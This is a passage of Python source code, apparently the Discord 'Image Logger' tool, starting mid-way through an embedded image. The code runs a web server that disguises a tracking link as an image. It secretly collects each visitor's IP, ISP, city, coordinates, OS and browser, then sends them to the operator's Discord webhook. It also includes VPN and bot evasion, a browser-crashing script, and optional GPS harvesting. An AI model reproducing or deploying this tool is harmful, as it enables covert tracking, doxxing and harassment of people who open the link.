QFEU7KxiSsY4SsY5KwSIAJKxiBMYI1khEF0McPdJNM6OBHjsqY3vpZLKqWpdAFZkOPS3kISNUyidojHQQe/1WTozV7GtwJubPTylz/ipgRe4kAEibgWBm5VMStOPXmjn4iWmpN0uTNAVqJLml7GZ2bAOyvbcZu0SNSNtIT6o8r5kNOWlJRbp/T5Io+u17ZlozzbMzs1aYEj4gWtcCIMQb67K5KX51GUHH4fZ/ugVJ7WmWlpEAkGoBmYdWiCRI5CTa42QTS5fcZqTXmT+XJ/nw9R3hfF24ap8THMIAIDg7M3caWdcxIb11WWTQwPC80eW/wAvxfM3+Jez+EqgVKZ93mGYOpHKCDcEt+H0Cs8cZbo5oZssPK967mK3gOWZrSOeSD49pIsddS7z9l9QbuGsGpJ7yB/yiUfDQnjSODB0h9VveSXfemUI9hXlm+pCG9Ewts8+Hrk1Hp0XbUWsXSGpVyE2oVwD/ST08kbF0g3VXc/Raw0Z9Wm4mVJpl4tJHW4N55ea2hsPiJDNDhVR31mjqSfkj4b7hfERXQSxNSSGzIb6nmle2xeCvzdwSAzO09YRROeyDD4TARI9RQlIOclYBJRMSUDElE1EWNRxYJJQAWBRRg1KsGmUydMVxtGg73VSMssq6gx2XRr9xv0VLjLlzIf8yHPeIhWfmcXfaJd5mfxSt2y0Y0kiuWTHgEoeQXD+8D2hjXe8YSQAO1ziPPzTRUr8vNCT0OD1cmesZwbGPaH/AEjIHAENz1BAiNAI2nxVqnzs4lPh1tpv4IBV4Rix/vP/ANlT5Lacnf6sZT4f+xfJADg8X/xJ/wDkq/JDTk7m1cP/AGL5Io7CYv8Atyf/AHanyW05O/1CpYP7V8kamErvp0wxzi83JLiT4Am8KitLcjKnK0qA1MU47BANAXudyCG4aQGo53L1/Ja2FJWKmo/7I8z8kLkU0wMMViuU7qO+/PRa2akXGJd0Rtg0ouMU7p6/Na2DQifS3dPL80bZtKJ9Ld09fmhbNoRduOeOXl+aOpm0IL/rWrBbIggjQ6Gx3R1MHhxF7cpuUjLxtopVcgOtitLVFCS5B3VbSd9B0TNkUtxMlIOcWMSVjElAxJWMRYxFgkWAREx1Ew3RdmYBvTM/yPsfJ3/MUy3+BJqpP1+6BhEchCxjSwWLrZcoccg17p0B132VoTlyRzZcWO9TW5s8R9razXZWNpZIbls6wgW+La48EcmRqWxHDwsXFOV2IP8Aamsfq0/J3/kk8WRX+lx+oA8fqfZZ5H5reLIP9ND1K/6+qfZZ5H5reLIP9ND1KnjdTk3yPzW8WRv6eBQ8Yf8AZb6/NDxJDeBE4eLP5N9fmh4kgeBEqeKv5N9fmt4jD4ESh4o/k31+a3iSD4ETPBUDoIiY7K1gJK1mJKxjuZYxMyxiwcjZqQQFAeLIVg2caL9NSiK3sUq1JKDdipUDKASLGOIGIsEixiSsAixiLBIiAJSOxRQrCNORwOoNj1BsR5JuW4PaRaoIJH6I2PiIKJjlMfoooDGjiLZRpudyRp4J9XQno6sSqVCSpNlUtimcrWw0TOVrZqJnKFhomcrWzUTMVrBRzOVrZqRC4oWw0iuYoWakRYJFjHVjERARYxFjHVjFljFgVg2dlY1nKh28fkszA0DHCsY4gEixiLGJCwCQsazsLUayQjRrJC1As7CNGsPTdmGU+HeqR3VE3s7KzIE7S3yuPv8ARAY6HomKvqJWzJA0BiLGOLGIsYiBjqJjiBjiBjiwT//Z", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
